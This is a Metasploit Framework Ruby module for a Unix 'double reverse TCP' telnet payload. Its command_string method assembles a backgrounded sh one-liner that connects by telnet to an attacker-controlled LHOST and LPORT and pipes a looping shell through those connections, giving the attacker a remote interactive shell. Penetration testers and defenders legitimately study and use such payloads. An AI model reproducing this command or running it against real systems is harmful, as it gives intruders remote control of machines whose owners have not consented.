##
# $Id: reverse.rb 8615 2010-02-24 01:19:59Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp_double'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

	include Msf::Payload::Single
	include Msf::Sessions::CommandShellOptions

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Unix Command Shell, Double reverse TCP (telnet)',
			'Version'       => '$Revision: 8615 $',
			'Description'   => 'Creates an interactive shell through two inbound connections',
			'Author'        => 'hdm',
			'License'       => MSF_LICENSE,
			'Platform'      => 'unix',
			'Arch'          => ARCH_CMD,
			'Handler'       => Msf::Handler::ReverseTcpDouble,
			'Session'       => Msf::Sessions::CommandShell,
			'PayloadType'   => 'cmd',
			'RequiredCmd'   => 'telnet',
			'Payload'       =>
				{
					'Offsets' => { },
					'Payload' => ''
				}
			))
	end

	#
	# Constructs the payload
	#
	def generate
		return super + command_string
	end

	#
	# Returns the command string to use for execution
	#
	def command_string
		cmd =
			"sh -c '(sleep #{3600+rand(1024)}|" +
			"telnet #{datastore['LHOST']} #{datastore['LPORT']}|" +
			"while : ; do sh && break; done 2>&1|" +
			"telnet #{datastore['LHOST']} #{datastore['LPORT']}" +
			" >/dev/null 2>&1 &)'"
		return cmd
	end

end
